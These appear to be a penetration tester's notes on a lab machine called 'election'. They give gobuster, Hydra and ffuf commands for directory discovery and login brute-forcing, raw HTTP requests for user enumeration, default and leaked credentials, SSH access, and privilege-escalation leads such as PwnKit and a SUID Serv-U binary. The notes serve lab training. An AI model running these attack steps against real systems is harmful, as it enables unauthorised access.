Ports: 22, 80

```bash
gobuster dir -u http://192.168.201.211 -w /usr/share/wordlists/dirb/common.txt
```

```
/index.html           (Status: 200) [Size: 10918]
/javascript           (Status: 301) [Size: 323] [--> http://192.168.201.211/javascript/]
/phpmyadmin           (Status: 301) [Size: 323] [--> http://192.168.201.211/phpmyadmin/]
/phpinfo.php          (Status: 200) [Size: 95443]
/robots.txt           (Status: 200) [Size: 30]
```

```
http://192.168.201.211/robots.txt

admin
wordpress
user
election
```

```
http://192.168.201.211/phpinfo.php

# PHP Version 7.1.33
```

| System                    | Linux election 5.4.0-120-generic #136~18.04.1-Ubuntu SMP Fri Jun 10 18:00:44 UTC 2022 x86_64                                                 |     |
| ------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------- | --- |
| Loaded Configuration File | /etc/php/7.1/apache2/php.ini                                                                                                                 |     |
| Registered PHP Streams    | https, ftps, compress.zlib, php, file, glob, data, http, ftp, phar, zip                                                                      |     |
| Registered Stream Filters | zlib.*, string.rot13, string.toupper, string.tolower, string.strip_tags, convert.*, consumed, dechunk, convert.iconv.*, mcrypt.*, mdecrypt.* |     |
|                           |                                                                                                                                              |     |
| DOCUMENT_ROOT             | /var/www/html                                                                                                                                |     |
| User/Group                | www-data(33)/33                                                                                                                              |     |
| allow_url_fopen           | On                                                                                                                                           | On  |
| allow_url_include         | On                                                                                                                                           | On  |
|                           |                                                                                                                                              |     |
| iconv support             | enabled                                                                                                                                      |     |
| iconv implementation      | glibc                                                                                                                                        |     |
| iconv library version     | 2.27                                                                                                                                         |     |

Is valid site:
```bash
http://192.168.201.211/election/
http://192.168.201.211/election/admin/
```

```
http://192.168.201.211/election/admin/
CSS is hiding a password field. Use Burp to drop all CSS Requests.
```

SQLI exploits available
```bash
searchsploit election
# 48122
# https://github.com/J3rryBl4nks/eLection-TriPath-/blob/master/SQLiIntoRCE.md
```

Login brute-force:
```bash
hydra -I -l whatever -P /usr/share/wordlists/rockyou.txt 192.168.201.211 http-post-form \
"/election/admin/ajax/login.php:step=2&noinduk=1&sandi=^PASS^:F=denied"
```

```
ffuf -request login.req -request-proto http -w /usr/share/wordlists/rockyou.txt -fr 'Access denied'
```

```bash
gobuster dir -u http://192.168.201.211/election/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt -x php

# /card.php             (Status: 200) [Size: 1935]
# => weird file with 1s and 0s, but nothing interesting
```

User enum
```http
POST /election/admin/ajax/pemilihan.php HTTP/1.1
Host: 192.168.201.211
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 27
Origin: http://192.168.201.211
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://192.168.201.211/election/
Cookie: PHPSESSID=dn5v1b1dsl8itm76iied6be42s; el_lang=en-us;
Priority: u=0

step=start&kode_akses=FUZZ
```

Login brute-force:
```bash
ffuf -request user.req -request-proto http -w /usr/share/wordlists/rockyou.txt -fr 'Code is incorrect'
```

Default credentials:
```
https://sourceforge.net/p/election-by-tripath/wiki/Documentation%20-%20Installer%20Guide/

ID: 1234  
Password: 1234
```

Req:
```
POST /election/admin/ajax/login.php HTTP/1.1
Host: 192.168.201.211
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 19
Origin: http://192.168.201.211
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://192.168.201.211/election/admin/
Cookie: PHPSESSID=n8flsi0miam5nd19ast45hes3s; el_lang=en-us
Priority: u=0

step=1&noinduk=1234
```

Resp:
```
HTTP/1.1 200 OK
Date: Tue, 20 May 2025 21:31:21 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: blocked_num=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/
Vary: Accept-Encoding
Content-Length: 91
Keep-Alive: timeout=5, max=98
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

{"nama":"Love","role":"Administrator","not_me":"Not Love?","picture":"..\/media\/user.png"}
```
=> Username: Love

the right way to fuzz
```bash
gobuster dir -u http://192.168.201.211/election/admin/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -f
```

=> `/logs/system.log`
```
http://192.168.201.211/election/admin/logs/system.log

[2020-01-01 00:00:00] Assigned Password for the user love: P@$$w0rd@123
[2020-04-03 00:13:53] Love added candidate 'Love'.
[2020-04-08 19:26:34] Love has been logged in from Unknown IP on Firefox (Linux).
[2025-05-21 01:41:01] Unknown IP is blocked from system. Cause: Brute-force @1's password.
[2025-05-21 02:16:56]  has been logged out from Unknown IP.
```

SSH login as love:
```bash
ssh love@192.168.201.211
# P@$$w0rd@123
```

# PrivEsc

PwnKit kernel exploit

or

SUID binary Serv-U:
```
/usr/local/Serv-U

searchsploit serv-u
```